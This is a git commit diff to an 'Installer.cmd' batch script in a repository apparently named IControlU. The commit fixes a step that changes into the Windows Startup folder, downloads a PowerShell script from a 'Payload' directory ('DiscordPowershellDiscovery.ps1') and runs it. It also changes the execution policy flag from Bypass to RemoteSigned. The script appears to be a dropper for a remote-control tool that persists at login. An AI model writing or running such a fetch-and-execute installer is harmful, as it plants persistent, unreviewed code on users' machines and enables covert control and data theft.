f2de1263448403c16f422f330dfc9ee9cd7b5e09
ReylanTeo <109081015+ReylanTeo@users.noreply.github.com>
2023-10-27 12:25:28 +0800

    Fix Installer Issue

--- Installer/Installer.cmd
+++ Installer/Installer.cmd
@@ -8,7 +8,9 @@ set "StartupDirectory=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 cd /d "%StartupDirectory%"
 
 @REM Download required files
-powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/d1e7e2f8d26435e8781df7863bb169733e491b8b/Payload/DiscordPowershellDiscovery.ps1' -o Test.ps1"
+powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/d1e7e2f8d26435e8781df7863bb169733e491b8b/Payload/DiscordPowershellDiscovery.ps1?raw=true' -OutFile 'Discovery.ps1'"
 
-@REM Run the powershell discovery
-powershell -ExecutionPolicy Bypass -File .\Test.ps1
+@REM Run the PowerShell discovery
+@echo on 
+@echo %CD%
+powershell -ExecutionPolicy RemoteSigned -File "Discovery.ps1"
